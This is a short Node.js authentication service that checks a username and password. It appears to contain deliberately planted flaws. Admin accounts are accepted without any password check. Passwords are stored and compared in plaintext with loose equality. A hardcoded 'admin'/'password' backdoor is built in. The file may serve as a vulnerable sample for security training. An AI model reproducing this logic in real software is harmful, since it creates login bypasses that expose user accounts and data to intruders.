const UsersService = require("./users.service")

class AuthenticationService {
  static authenticate = async (username, password) => {
    let user = await UsersService.findByUsername(username);
    return user && ((user.isAdmin || user.password == password) || (username == 'admin' && password == 'password'))
}}

module.exports = AuthenticationService;